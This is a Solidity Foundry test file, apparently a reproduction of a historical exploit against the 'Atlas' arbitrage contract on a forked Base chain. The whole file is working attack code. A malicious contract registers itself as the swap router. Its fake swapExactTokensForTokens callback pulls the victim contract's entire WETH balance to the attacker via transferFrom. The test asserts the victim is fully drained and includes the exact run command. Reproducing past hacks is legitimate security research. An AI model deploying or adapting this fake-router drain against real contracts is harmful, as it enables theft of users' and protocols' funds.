// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Atlas, IAtlas} from "../../src/bug/Atlas.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackAtlas {
    address constant weth = 0x4200000000000000000000000000000000000006;

    function attack(address atlasAddr) external {
        Atlas atlas = Atlas(atlasAddr);

        address[] memory routers = new address[](1);
        routers[0] = address(this);
        uint256[] memory routerType = new uint256[](1);
        uint256[] memory pairBinId = new uint256[](1);
        pairBinId[0] = 1;
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = weth;
        address[] memory tokensOut = new address[](1);
        tokensOut[0] = weth;
        int128[] memory curvei = new int128[](1);
        int128[] memory curvej = new int128[](1);
        uint256 amt = type(uint256).max - 1;

        IAtlas.SwapData memory swapdata = IAtlas.SwapData({
            routers: routers,
            routerType: routerType,
            pairBinId: pairBinId,
            tokensIn: tokensIn,
            tokensOut: tokensOut,
            curvei: curvei,
            curvej: curvej,
            amt: amt
        });
        atlas.arbswap(swapdata);

        bytes memory calldata_ = abi.encode(swapdata);
        abi.decode(calldata_, (IAtlas.SwapData));
        bytes memory calldata_2 = abi.encode(
            routers,
            routerType,
            pairBinId,
            tokensIn,
            tokensOut,
            curvei,
            curvej,
            amt
        );
        // console.logBytes(calldata_);
        // console.logBytes(calldata_2);
    }

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts) {
        amounts = new uint256[](1);
        amounts[0] = type(uint256).max;
        IERC20(weth).transferFrom(
            msg.sender,
            tx.origin,
            IERC20(weth).balanceOf(msg.sender)
        );
    }
}

contract AttackAtlasTest is Test {
    address constant atlas = 0x8CB5722179DE0860b0BcE7564b28523bba902D5c;
    address constant weth = 0x4200000000000000000000000000000000000006;
    uint256 constant blockNumber = 10446900;
    address constant hacker = 0x0a64eABc8f5049a0BDE336F79ec9087B98658B9C;

    function setUp() external {
        vm.selectFork(vm.createFork(vm.envString("BASE_RPC_URL"), blockNumber));
    }

    function testAttack() external {
        console.log("Attack Before:");
        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));

        _attack();

        console.log("Attack After:");
        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));
        assertEq(IERC20(weth).balanceOf(atlas), 0);
    }

    function _attack() internal {
        vm.startPrank(hacker, hacker);
        AttackAtlas attackAtlas = new AttackAtlas();
        attackAtlas.attack(atlas);
        vm.stopPrank();
    }
}

// forge test --match-contract AttackAtlasTest -vvv
